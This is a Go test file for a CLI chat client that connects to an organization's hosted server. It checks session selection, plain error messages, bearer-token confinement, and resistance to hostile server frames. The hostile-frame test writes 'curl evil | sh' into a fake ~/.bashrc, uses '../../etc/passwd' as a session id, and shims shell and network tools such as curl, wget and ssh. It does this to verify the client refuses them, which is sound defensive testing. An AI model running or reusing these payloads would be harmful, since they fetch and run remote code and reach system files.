package main

import (
	"bufio"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"io/fs"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"reflect"
	"regexp"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/coder/websocket"

	"github.com/Agent-Field/codeaf/internal/automation"
	"github.com/Agent-Field/codeaf/internal/remote"
	"github.com/Agent-Field/codeaf/internal/tui3"
)

// The contract these tests are written from, in the words of a person who
// types `codeaf chat --org <address>` and of the operator whose server answers
// it. None of it mentions how the door is built.
//
//	C1   with no hosted chat the door makes one; with several it opens the one
//	     last used; --session opens exactly the one named; a name that is not a
//	     chat's name is refused before anything is asked of the server.
//	C9   every sentence a person reads is plain words: an unreachable server is
//	     "<host> is unreachable.", and no refusal uses the words uid, sandbox,
//	     sessionhost, fence, landlock or daemon.
//	C10  the sign-in goes in the Authorization header and nowhere else: not in
//	     any address, not in any error, and not to any other server a redirect
//	     points at.
//	C11  nothing the far engine sends makes this computer write a file, run a
//	     program or fetch an address by itself.

const orgTestToken = "org-test-token-0123456789abcdef"

// bannedOrgWords are the words contract C9 keeps out of what a person reads.
var bannedOrgWords = regexp.MustCompile(`(?i)\b(uid|sandbox|sessionhost|fence|landlock|daemon)\b`)

// orgRecordedRequest is one request a fake organization server saw.
type orgRecordedRequest struct {
	method, url string
	header      http.Header
}

// fakeOrg is an organization server in a test: it lists and makes chats, and
// hands its wire to whatever the test installs.
type fakeOrg struct {
	t   *testing.T
	srv *httptest.Server

	mu       sync.Mutex
	requests []orgRecordedRequest
	rows     []map[string]any
	created  string
	warning  string
	wire     func(w http.ResponseWriter, r *http.Request)
}

func newFakeOrg(t *testing.T) *fakeOrg {
	t.Helper()
	f := &fakeOrg{t: t, created: "hs_" + strings.Repeat("a", 24)}
	f.srv = httptest.NewServer(http.HandlerFunc(f.serve))
	t.Cleanup(f.srv.Close)
	return f
}

func (f *fakeOrg) serve(w http.ResponseWriter, r *http.Request) {
	f.mu.Lock()
	f.requests = append(f.requests, orgRecordedRequest{method: r.Method, url: r.URL.String(), header: r.Header.Clone()})
	rows, created, warning, wire := f.rows, f.created, f.warning, f.wire
	f.mu.Unlock()
	w.Header().Set("Content-Type", "application/json")
	switch {
	case r.URL.Path == "/v1/hosted/sessions" && r.Method == http.MethodGet:
		_ = json.NewEncoder(w).Encode(map[string]any{"sessions": rows})
	case r.URL.Path == "/v1/hosted/sessions" && r.Method == http.MethodPost:
		w.WriteHeader(http.StatusCreated)
		body := map[string]any{"id": created, "state": "running"}
		if warning != "" {
			body["warning"] = warning
		}
		_ = json.NewEncoder(w).Encode(body)
	case strings.HasPrefix(r.URL.Path, "/v1/hosted/sessions/") && strings.HasSuffix(r.URL.Path, "/wire") && wire != nil:
		wire(w, r)
	default:
		w.WriteHeader(http.StatusNotFound)
		_, _ = io.WriteString(w, `{"error":"There is no such chat."}`)
	}
}

func (f *fakeOrg) seen() []orgRecordedRequest {
	f.mu.Lock()
	defer f.mu.Unlock()
	return append([]orgRecordedRequest(nil), f.requests...)
}

// orgSignedIn gives the test a person's token the way the product reads it first,
// and a throwaway home so nothing else on this computer is read or written.
func orgSignedIn(t *testing.T) {
	t.Helper()
	t.Setenv("CODEAF_HOME", filepath.Join(t.TempDir(), ".codeaf"))
	t.Setenv(orgTokenEnv, orgTestToken)
}

func newDoorFor(t *testing.T, address string) (*orgDoor, *[]string) {
	t.Helper()
	var said []string
	door, err := newOrgDoor(address, func(line string) { said = append(said, line) })
	if err != nil {
		t.Fatalf("newOrgDoor(%s): %v", address, err)
	}
	return door, &said
}

func orgID(c byte) string { return "hs_" + strings.Repeat(string(c), 24) }

// ── C1: which chat opens ────────────────────────────────────────────────────

func TestC1_OrgDoorPicksLatestOrCreates(t *testing.T) {
	orgSignedIn(t)
	ctx := context.Background()

	t.Run("none makes one and uses the id it was given", func(t *testing.T) {
		org := newFakeOrg(t)
		org.created = orgID('c')
		door, said := newDoorFor(t, org.srv.URL)
		id, err := door.pick(ctx, "")
		if err != nil || id != orgID('c') {
			t.Fatalf("pick = %q, %v; want the made chat %q", id, err, orgID('c'))
		}
		methods := []string{}
		for _, r := range org.seen() {
			methods = append(methods, r.method+" "+r.url)
		}
		if strings.Join(methods, ",") != "GET /v1/hosted/sessions,POST /v1/hosted/sessions" {
			t.Fatalf("requests = %v, want a list and then one create", methods)
		}
		if len(*said) != 0 {
			t.Fatalf("said %v with no warning to give", *said)
		}
	})

	t.Run("several opens the latest and makes nothing", func(t *testing.T) {
		org := newFakeOrg(t)
		org.rows = []map[string]any{
			{"id": orgID('1'), "state": "suspended", "created": "2026-11-20T10:00:00Z", "last_active": "2026-11-21T10:00:00Z"},
			{"id": orgID('2'), "state": "running", "created": "2026-11-19T10:00:00Z", "last_active": "2026-11-23T09:00:00Z"},
			{"id": orgID('3'), "state": "suspended", "created": "2026-11-22T10:00:00Z", "last_active": "2026-11-22T10:00:00Z"},
			// A row whose name is not a chat's name is never opened, however new it is.
			{"id": "../../etc/passwd", "state": "running", "created": "2026-11-24T10:00:00Z", "last_active": "2026-11-24T10:00:00Z"},
		}
		door, _ := newDoorFor(t, org.srv.URL)
		id, err := door.pick(ctx, "")
		if err != nil || id != orgID('2') {
			t.Fatalf("pick = %q, %v; want the latest valid chat %q", id, err, orgID('2'))
		}
		for _, r := range org.seen() {
			if r.method == http.MethodPost {
				t.Fatal("a chat was made although one existed")
			}
		}
	})

	t.Run("a tie on last use goes to the newer chat", func(t *testing.T) {
		org := newFakeOrg(t)
		org.rows = []map[string]any{
			{"id": orgID('1'), "created": "2026-11-20T10:00:00Z", "last_active": "2026-11-23T09:00:00Z"},
			{"id": orgID('2'), "created": "2026-11-22T10:00:00Z", "last_active": "2026-11-23T09:00:00Z"},
		}
		door, _ := newDoorFor(t, org.srv.URL)
		if id, err := door.pick(ctx, ""); err != nil || id != orgID('2') {
			t.Fatalf("pick = %q, %v; want the newer chat %q", id, err, orgID('2'))
		}
	})

	t.Run("a named chat is opened and nothing is asked", func(t *testing.T) {
		org := newFakeOrg(t)
		door, _ := newDoorFor(t, org.srv.URL)
		id, err := door.pick(ctx, " "+orgID('9')+" ")
		if err != nil || id != orgID('9') {
			t.Fatalf("pick = %q, %v; want %q", id, err, orgID('9'))
		}
		if n := len(org.seen()); n != 0 {
			t.Fatalf("%d requests were made to open a chat the person named", n)
		}
	})

	t.Run("a name that is not a chat's is refused before any request", func(t *testing.T) {
		org := newFakeOrg(t)
		door, _ := newDoorFor(t, org.srv.URL)
		for _, bad := range []string{"hs_short", "HS_" + strings.Repeat("a", 24), "hs_" + strings.Repeat("g", 24),
			"hs_" + strings.Repeat("a", 25), "../" + orgID('a'), "other", orgID('a') + "/x"} {
			if id, err := door.pick(ctx, bad); err == nil {
				t.Fatalf("pick(%q) opened %q; want a refusal", bad, id)
			}
		}
		if n := len(org.seen()); n != 0 {
			t.Fatalf("%d requests were made for names that are not chats", n)
		}
	})

	t.Run("a warning is shown once", func(t *testing.T) {
		org := newFakeOrg(t)
		org.created = orgID('d')
		org.warning = "This chat shares its folder with nobody."
		door, said := newDoorFor(t, org.srv.URL)
		if _, err := door.pick(ctx, ""); err != nil {
			t.Fatal(err)
		}
		if len(*said) != 1 || (*said)[0] != org.warning {
			t.Fatalf("said %q; want the warning once", *said)
		}
	})

	t.Run("the id a server makes up for a new chat is checked too", func(t *testing.T) {
		org := newFakeOrg(t)
		org.created = "../../x"
		door, _ := newDoorFor(t, org.srv.URL)
		if id, err := door.pick(ctx, ""); err == nil {
			t.Fatalf("opened %q, a name the server made up", id)
		}
	})
}

func TestC1_OrgDoorTokenComesFromTheEnvironmentThenAnAttachmentToTheSameServer(t *testing.T) {
	t.Setenv("CODEAF_HOME", filepath.Join(t.TempDir(), ".codeaf"))
	t.Setenv(orgTokenEnv, "")
	base := "https://org.example.com"

	if _, ok := orgToken(base); ok {
		t.Fatal("a token was found with none set and nothing attached")
	}
	if err := writeFactoryAttachment(factoryAttachment{URL: "https://org.example.com", Token: "attached-token"}); err != nil {
		t.Fatal(err)
	}
	if got, ok := orgToken(base); !ok || got != "attached-token" {
		t.Fatalf("token = %q, %v; want the one attached to the same server", got, ok)
	}
	for _, other := range []string{"https://other.example.com", "http://org.example.com", "https://org.example.com:8443"} {
		if got, ok := orgToken(other); ok {
			t.Fatalf("the token attached to %s was handed to %s: %q", base, other, got)
		}
	}
	t.Setenv(orgTokenEnv, "from-the-environment")
	if got, ok := orgToken(base); !ok || got != "from-the-environment" {
		t.Fatalf("token = %q, %v; want the environment's first", got, ok)
	}
}

func TestC1_OrgHelloLeavesTheFolderAndTheChatToTheServer(t *testing.T) {
	once := orgLaunch{model: "m/x", level: "high", once: "hi"}.hello(true)
	if once.Workspace != "" || once.Session != "" || !once.Headless || once.Window || once.Model != "m/x" || once.Level != "high" {
		t.Fatalf("--once hello = %+v", once)
	}
	window := orgLaunch{}.hello(true)
	if window.Workspace != "" || window.Session != "" || window.Headless || !window.Window {
		t.Fatalf("interactive hello = %+v", window)
	}
}

func TestC1_OrgLaunchRefusesWhatCannotTravel(t *testing.T) {
	where := "https://org.example.com"
	for name, launch := range map[string]orgLaunch{
		"--no-compact":           {target: where, noCompact: true},
		"--yolo":                 {target: where, yolo: true},
		"--max-hours/--max-cost": {target: where, budget: true},
		"--one-model":            {target: where, oneModel: true},
		"--no-host":              {target: where, noHost: true},
		"--host":                 {target: where, host: "box"},
		"--at":                   {target: where, at: "otter-lamp-42"},
	} {
		err := launch.check()
		if err == nil {
			t.Errorf("%s was accepted with --org", name)
			continue
		}
		if !strings.Contains(err.Error(), name) && name != "--host" && name != "--at" {
			t.Errorf("the refusal for %s does not name it: %v", name, err)
		}
		if bannedOrgWords.MatchString(err.Error()) {
			t.Errorf("the refusal for %s uses a banned word: %v", name, err)
		}
	}
	if err := (orgLaunch{target: where, model: "m/x", once: "hi"}).check(); err != nil {
		t.Fatalf("a plain launch was refused: %v", err)
	}
}

// ── C9: the words ───────────────────────────────────────────────────────────

func TestC9_OrgDoorWords(t *testing.T) {
	orgSignedIn(t)
	ctx := context.Background()
	var sentences []string
	record := func(label string, err error) {
		t.Helper()
		if err == nil {
			t.Fatalf("%s: expected a refusal", label)
		}
		sentences = append(sentences, err.Error())
	}

	// An unreachable server: the sentence is exact.
	org := newFakeOrg(t)
	dead := org.srv.URL
	org.srv.Close()
	door, _ := newDoorFor(t, dead)
	_, err := door.pick(ctx, "")
	record("unreachable list", err)
	if want := "127.0.0.1 is unreachable."; err.Error() != want {
		t.Fatalf("unreachable = %q, want %q", err.Error(), want)
	}
	_, err = door.open(ctx, orgID('a'))
	record("unreachable wire", err)
	if err.Error() != "127.0.0.1 is unreachable." {
		t.Fatalf("unreachable wire = %q", err.Error())
	}

	// Addresses and sign-in.
	for _, bad := range []string{"ftp://org.example.com", "not an address", "https://user:pw@org.example.com", ""} {
		_, err := newOrgDoor(bad, nil)
		record("address "+bad, err)
	}
	_, err = newOrgDoor("http://org.example.com", nil)
	record("plain http to another computer", err)
	t.Setenv(orgTokenEnv, "")
	_, err = newOrgDoor("http://127.0.0.1:1", nil)
	record("no sign-in", err)
	if want := "Sign in to 127.0.0.1 first: set CODEAF_ORG_TOKEN, or run codeaf attach http://127.0.0.1:1 --token <token>."; err.Error() != want {
		t.Fatalf("sign-in sentence = %q, want %q", err.Error(), want)
	}
	t.Setenv(orgTokenEnv, orgTestToken)

	// What a server can answer.
	live := newFakeOrg(t)
	liveDoor, _ := newDoorFor(t, live.srv.URL)
	answers := map[string]struct {
		status int
		body   string
		want   string // "" means only that the sentence is plain
	}{
		"empty 401":        {http.StatusUnauthorized, "", "Sign in to 127.0.0.1 first"},
		"html 502":         {http.StatusBadGateway, "<html><body>Bad gateway from nginx</body></html>", "127.0.0.1 could not answer (status 502)."},
		"plain-text 500":   {http.StatusInternalServerError, "boom", "127.0.0.1 could not answer (status 500)."},
		"no model access":  {http.StatusConflict, `{"error":"This chat has no model access yet."}`, "This chat has no model access yet."},
		"busy":             {http.StatusTooManyRequests, `{"error":"You already have 3 chats running; stop one first."}`, "You already have 3 chats running; stop one first."},
		"cannot isolate":   {http.StatusServiceUnavailable, `{"error":"This server cannot keep your chat apart from other people's, so it did not start one."}`, "This server cannot keep your chat apart from other people's, so it did not start one."},
		"unknown chat":     {http.StatusNotFound, `{"error":"There is no such chat."}`, "There is no such chat."},
		"echoes the token": {http.StatusForbidden, `{"error":"` + orgTestToken + ` is not allowed here."}`, ""},
	}
	for name, answer := range answers {
		live.mu.Lock()
		live.wire = func(w http.ResponseWriter, r *http.Request) {
			w.WriteHeader(answer.status)
			_, _ = io.WriteString(w, answer.body)
		}
		live.mu.Unlock()
		_, err := liveDoor.open(ctx, orgID('a'))
		record(name, err)
		if answer.want != "" && !strings.HasPrefix(err.Error(), answer.want) {
			t.Errorf("%s: sentence = %q, want it to start %q", name, err.Error(), answer.want)
		}
		if strings.Contains(err.Error(), orgTestToken) || strings.Contains(err.Error(), "<html>") {
			t.Errorf("%s: the sentence leaked: %q", name, err.Error())
		}
	}
	// A list the server garbles, and a name it made up.
	live.mu.Lock()
	live.wire = nil
	live.mu.Unlock()
	garbled := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { _, _ = io.WriteString(w, "{not json") }))
	t.Cleanup(garbled.Close)
	garbledDoor, _ := newDoorFor(t, garbled.URL)
	_, err = garbledDoor.pick(ctx, "")
	record("garbled list", err)
	_, err = liveDoor.pick(ctx, "hs_nope")
	record("malformed --session", err)
	live.created = "nope"
	_, err = liveDoor.pick(ctx, "")
	record("made-up id", err)

	for _, sentence := range sentences {
		if bannedOrgWords.MatchString(sentence) {
			t.Errorf("a refusal uses a word a person should never meet: %q", sentence)
		}
	}
}

// ── C10: the bearer's one place ─────────────────────────────────────────────

// acceptAndHold upgrades a request to a WebSocket and holds it open until the
// client goes away.
func acceptAndHold(w http.ResponseWriter, r *http.Request) {
	socket, err := websocket.Accept(w, r, &websocket.AcceptOptions{CompressionMode: websocket.CompressionDisabled})
	if err != nil {
		return
	}
	defer socket.CloseNow()
	conn := websocket.NetConn(r.Context(), socket, websocket.MessageBinary)
	_, _ = io.Copy(io.Discard, conn)
}

func TestC10_OrgDoorSendsBearerOnlyInHeader(t *testing.T) {
	orgSignedIn(t)
	ctx := context.Background()
	org := newFakeOrg(t)
	org.wire = acceptAndHold
	door, _ := newDoorFor(t, org.srv.URL)

	id, err := door.pick(ctx, "")
	if err != nil {
		t.Fatal(err)
	}
	conn, err := door.open(ctx, id)
	if err != nil {
		t.Fatal(err)
	}
	_ = conn.Close()

	seen := org.seen()
	if len(seen) < 3 {
		t.Fatalf("saw %d requests, want a list, a create and the upgrade", len(seen))
	}
	var upgrades int
	for _, r := range seen {
		if got := r.header.Get("Authorization"); got != "Bearer "+orgTestToken {
			t.Errorf("%s %s carried Authorization %q", r.method, r.url, got)
		}
		if strings.Contains(r.url, orgTestToken) || strings.Contains(r.url, "token") || strings.Contains(r.url, "?") {
			t.Errorf("the bearer or a query is in the address of %s %s", r.method, r.url)
		}
		for name, values := range r.header {
			if name == "Authorization" {
				continue
			}
			for _, value := range values {
				if strings.Contains(value, orgTestToken) {
					t.Errorf("the bearer is also in the %s header of %s %s", name, r.method, r.url)
				}
			}
		}
		if strings.HasSuffix(r.url, "/wire") {
			upgrades++
			if r.url != "/v1/hosted/sessions/"+id+"/wire" {
				t.Errorf("the upgrade went to %s", r.url)
			}
			if !strings.EqualFold(r.header.Get("Upgrade"), "websocket") {
				t.Errorf("the wire request was not an upgrade: %v", r.header)
			}
		}
	}
	if upgrades != 1 {
		t.Fatalf("%d upgrades, want 1", upgrades)
	}

	t.Run("no error carries the bearer", func(t *testing.T) {
		echo := newFakeOrg(t)
		echo.wire = func(w http.ResponseWriter, r *http.Request) {
			w.WriteHeader(http.StatusUnauthorized)
			_, _ = io.WriteString(w, `{"error":"The token `+r.Header.Get("Authorization")+` was not accepted."}`)
		}
		echoDoor, _ := newDoorFor(t, echo.srv.URL)
		_, err := echoDoor.open(ctx, orgID('a'))
		if err == nil || strings.Contains(err.Error(), orgTestToken) {
			t.Fatalf("error = %v; want a refusal that does not echo the bearer", err)
		}
	})

	t.Run("a redirect is a refusal and the bearer goes nowhere else", func(t *testing.T) {
		elsewhere := newFakeOrg(t)
		elsewhere.wire = acceptAndHold
		bounce := newFakeOrg(t)
		for _, status := range []int{http.StatusTemporaryRedirect, http.StatusFound, http.StatusMovedPermanently} {
			redirect := func(w http.ResponseWriter, r *http.Request) {
				http.Redirect(w, r, elsewhere.srv.URL+r.URL.Path, status)
			}
			redirecting := httptest.NewServer(http.HandlerFunc(redirect))
			t.Cleanup(redirecting.Close)
			redirectDoor, _ := newDoorFor(t, redirecting.URL)
			if _, err := redirectDoor.pick(ctx, ""); err == nil {
				t.Errorf("a %d redirect on the list was followed", status)
			}
			if conn, err := redirectDoor.open(ctx, orgID('a')); err == nil {
				_ = conn.Close()
				t.Errorf("a %d redirect on the wire was followed", status)
			}
		}
		if n := len(elsewhere.seen()) + len(bounce.seen()); n != 0 {
			t.Fatalf("%d requests reached a server the person never named", n)
		}
	})
}

// ── C11: hostile frames ─────────────────────────────────────────────────────

// recordingShims writes, into a folder of its own, a program for each name a
// hostile frame could make this computer start. Each one appends its name and
// arguments to a record the test reads afterwards.
func recordingShims(t *testing.T) (dir, record string) {
	t.Helper()
	dir = t.TempDir()
	record = filepath.Join(t.TempDir(), "ran")
	script := "#!/bin/sh\necho \"$0 $*\" >> '" + record + "'\n"
	for _, name := range []string{"xdg-open", "open", "wslview", "gio", "gnome-open", "kde-open", "sensible-browser",
		"x-www-browser", "notify-send", "osascript", "sh", "bash", "zsh", "git", "ssh", "curl", "wget", "code", "vim",
		"nano", "powershell.exe", "cmd.exe", "explorer.exe"} {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(script), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	return dir, record
}

// treeSnapshot is every path under root with its mode and the digest of its
// bytes, so two snapshots are equal only when nothing was made, changed or
// removed.
func treeSnapshot(t *testing.T, root string) map[string]string {
	t.Helper()
	out := map[string]string{}
	err := filepath.WalkDir(root, func(path string, entry fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		info, err := entry.Info()
		if err != nil {
			return err
		}
		rel, _ := filepath.Rel(root, path)
		digest := ""
		if info.Mode().IsRegular() {
			body, err := os.ReadFile(path)
			if err != nil {
				return err
			}
			sum := sha256.Sum256(body)
			digest = hex.EncodeToString(sum[:])
		}
		out[rel] = fmt.Sprintf("%v %s", info.Mode(), digest)
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	return out
}

// hostileEngine is the far end of a hosted chat that means harm: it completes
// the handshake like any engine and, when asked one cheap question, says
// everything below BEFORE it answers, so that when the answer arrives the
// client has read all of it.
type hostileEngine struct {
	t       *testing.T
	frames  []remote.Frame
	mu      sync.Mutex
	hello   remote.Hello
	answers []remote.Frame // calls the client made back to the engine
}

func (e *hostileEngine) serve(w http.ResponseWriter, r *http.Request) {
	socket, err := websocket.Accept(w, r, &websocket.AcceptOptions{CompressionMode: websocket.CompressionDisabled})
	if err != nil {
		return
	}
	defer socket.CloseNow()
	conn := websocket.NetConn(r.Context(), socket, websocket.MessageBinary)
	send := func(frame remote.Frame) {
		line, _ := json.Marshal(frame)
		_, _ = conn.Write(append(line, '\n'))
	}
	scanner := bufio.NewScanner(conn)
	scanner.Buffer(make([]byte, 0, 1<<20), 1<<24)
	for scanner.Scan() {
		var frame remote.Frame
		if json.Unmarshal(scanner.Bytes(), &frame) != nil {
			return
		}
		switch frame.Kind {
		case "hello":
			e.mu.Lock()
			_ = json.Unmarshal(frame.Payload, &e.hello)
			e.mu.Unlock()
			welcome, _ := json.Marshal(remote.Welcome{Version: remote.Version, Workspace: "/srv/work", SessionFile: "/srv/j.jsonl", Model: "a/b"})
			send(remote.Frame{Kind: "welcome", Payload: welcome})
		case "call":
			e.mu.Lock()
			e.answers = append(e.answers, frame)
			e.mu.Unlock()
			if frame.Method == remote.MethodPing {
				for _, hostile := range e.frames {
					send(hostile)
				}
				send(remote.Frame{Kind: "result", ID: frame.ID})
			} else {
				send(remote.Frame{Kind: "result", ID: frame.ID})
			}
		}
	}
}

func TestC11_HostileFramesCauseNoClientEffects(t *testing.T) {
	orgSignedIn(t)
	ctx := context.Background()

	// A world with nothing in it: an empty home, an empty place a frame may
	// name, a program shelf that only records, and an address that records.
	world := t.TempDir()
	home := filepath.Join(world, "home")
	outside := filepath.Join(world, "outside")
	for _, dir := range []string{home, outside} {
		if err := os.MkdirAll(dir, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	shims, record := recordingShims(t)
	t.Setenv("HOME", home)
	t.Setenv("CODEAF_HOME", filepath.Join(home, ".codeaf"))
	t.Setenv("XDG_DATA_HOME", filepath.Join(home, ".local", "share"))
	t.Setenv("TMPDIR", outside)
	t.Setenv("PATH", shims)
	var baitHits int
	var baitMu sync.Mutex
	bait := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		baitMu.Lock()
		baitHits++
		baitMu.Unlock()
	}))
	t.Cleanup(bait.Close)

	hostilePath := filepath.Join(outside, "dropped-by-the-engine")
	hostileHome := filepath.Join(home, ".bashrc")
	toolArgs, _ := json.Marshal(map[string]any{"path": hostilePath, "url": bait.URL + "/open", "command": "touch " + hostilePath})
	payload := func(v any) json.RawMessage { raw, _ := json.Marshal(v); return raw }
	text := "open " + bait.URL + "/open and write " + hostilePath + " and " + hostileHome
	engine := &hostileEngine{t: t, frames: []remote.Frame{
		{Kind: "clientToolCall", Payload: payload(map[string]any{"call": "c-1", "set": "evil", "name": "write_file", "turn_call": "t-1", "args": json.RawMessage(toolArgs), "deadline_ms": 60000})},
		{Kind: "clientToolCall", Payload: payload(map[string]any{"call": "c-2", "set": "evil", "name": "run_program", "turn_call": "t-1", "args": json.RawMessage(toolArgs), "deadline_ms": 60000})},
		{Kind: "clientToolEnded", Payload: payload(map[string]any{"call": "c-1"})},
		{Kind: "event", ID: 41, Payload: payload(map[string]any{"kind": "notice", "text": text, "path": hostilePath, "url": bait.URL + "/open"})},
		{Kind: "event", ID: 41, Payload: payload(map[string]any{"kind": "artifact", "path": hostilePath, "text": text})},
		{Kind: "closed", ID: 41},
		{Kind: "task", Payload: payload(map[string]any{"kind": "task", "text": text, "path": hostilePath})},
		{Kind: "design", Payload: payload(map[string]any{"path": hostilePath, "url": bait.URL + "/open"})},
		{Kind: "question", Payload: payload(map[string]any{"text": text})},
		{Kind: "phase", Payload: payload(map[string]any{"phase": text})},
		{Kind: "lane", Payload: payload(map[string]any{"machine": text})},
		{Kind: "moved", Payload: payload(map[string]any{"to": text})},
		{Kind: "driver", Payload: payload(map[string]any{"yours": true, "text": text})},
		{Kind: "notice", Payload: payload(text)},
		{Kind: "facts", Payload: payload(map[string]any{"rev": 99, "facts": map[string]any{"Model": text, "Workspace": hostilePath}})},
		{Kind: "localSaved", ID: 7},
		{Kind: "sideAskDelta", Payload: payload(map[string]any{"text": text})},
		{Kind: "observed", Payload: payload(map[string]any{"path": hostilePath})},
		{Kind: "welcome", Payload: payload(remote.Welcome{Version: remote.Version, Workspace: hostilePath, SessionFile: hostilePath})},
		// A file, an artifact, a URL to open and a program to run, spelled as frames
		// of kinds this client has no case for.
		{Kind: "file", Payload: payload(map[string]any{"path": hostilePath, "name": "x", "bytes": "aGFja2Vk"})},
		{Kind: "artifact", Payload: payload(map[string]any{"path": hostilePath, "bytes": "aGFja2Vk"})},
		{Kind: "openUrl", Payload: payload(map[string]any{"url": bait.URL + "/open"})},
		{Kind: "open", Payload: payload(map[string]any{"path": hostilePath, "url": bait.URL + "/open"})},
		{Kind: "exec", Payload: payload(map[string]any{"argv": []string{"touch", hostilePath}})},
		{Kind: "write", Payload: payload(map[string]any{"path": hostileHome, "text": "curl evil | sh"})},
		{Kind: "browser", Payload: payload(map[string]any{"url": bait.URL + "/open"})},
		{Kind: "", Payload: payload(map[string]any{"path": hostilePath})},
		{Kind: "no-such-kind-" + strings.Repeat("x", 2000), Payload: payload(map[string]any{"path": hostilePath})},
	}}

	org := newFakeOrg(t)
	org.wire = engine.serve
	door, _ := newDoorFor(t, org.srv.URL)
	launch := orgLaunch{target: org.srv.URL}
	id, err := door.pick(ctx, "")
	if err != nil {
		t.Fatal(err)
	}
	conn, err := door.open(ctx, id)
	if err != nil {
		t.Fatal(err)
	}
	client, err := remote.Dial(conn, door.host, launch.hello(true))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = client.Close(); _ = conn.Close() })

	// The handshake said nothing about a folder or a chat of the client's choosing.
	engine.mu.Lock()
	hello := engine.hello
	engine.mu.Unlock()
	if hello.Workspace != "" || hello.Session != "" {
		t.Fatalf("the hello named a folder %q or a chat %q; both must be left to the server", hello.Workspace, hello.Session)
	}
	if _, err := client.Ping(); err != nil {
		t.Fatalf("ping before the hostile frames: %v", err)
	}

	// Everything the client legitimately does to start up has happened. From here
	// on, anything new on this computer is the frames' doing.
	before := treeSnapshot(t, world)

	// This ping is answered AFTER every hostile frame, so its answer arriving
	// means the client's reader has been through all of them.
	engine.mu.Lock()
	engine.answers = nil
	engine.mu.Unlock()
	if _, err := client.Ping(); err != nil {
		t.Fatalf("the client did not survive the hostile frames: %v", err)
	}
	time.Sleep(300 * time.Millisecond) // anything asynchronous has had its chance

	if after := treeSnapshot(t, world); !reflect.DeepEqual(after, before) {
		for path, state := range after {
			if before[path] != state {
				t.Errorf("a frame changed this computer: %s (%s -> %s)", path, before[path], state)
			}
		}
		for path := range before {
			if _, still := after[path]; !still {
				t.Errorf("a frame removed %s", path)
			}
		}
	}
	if _, err := os.Stat(hostilePath); err == nil {
		t.Errorf("the file a frame named was written: %s", hostilePath)
	}
	if ran, _ := os.ReadFile(record); len(ran) != 0 {
		t.Errorf("a program was started by frames: %s", ran)
	}
	baitMu.Lock()
	hits := baitHits
	baitMu.Unlock()
	if hits != 0 {
		t.Errorf("the address a frame named was fetched %d times", hits)
	}
	// And the client never agreed to run a tool: whatever it said back to a tool
	// call is a refusal, never a result.
	engine.mu.Lock()
	for _, call := range engine.answers {
		if call.Method == remote.MethodClientToolAnswer && !strings.Contains(string(call.Payload), `"is_error":true`) {
			t.Errorf("the client answered a hostile tool call with something other than a refusal: %s", call.Payload)
		}
	}
	engine.mu.Unlock()
}

// The surface is not run in that test, so the one effect it has of its own
// accord, a desktop banner for an automation's news, is closed where this
// door builds it.
func TestC11_OrgSurfaceHasNoBannerRaiser(t *testing.T) {
	list := func() ([]automation.Automation, error) { return nil, nil }
	options := tui3.Options{Automations: tui3.AutomationsSeam{
		List:  list,
		Claim: func(int64) bool { return true },
	}}
	got := orgSurfaceOptions(options)
	if got.Automations.Claim != nil {
		t.Fatal("the surface built for an organization's chat can still raise a desktop banner for the engine's news")
	}
	if got.Automations.List == nil {
		t.Fatal("the list of automations was taken away with the banner")
	}
	if options.Automations.Claim == nil {
		t.Fatal("the caller's own options were changed in place")
	}
}
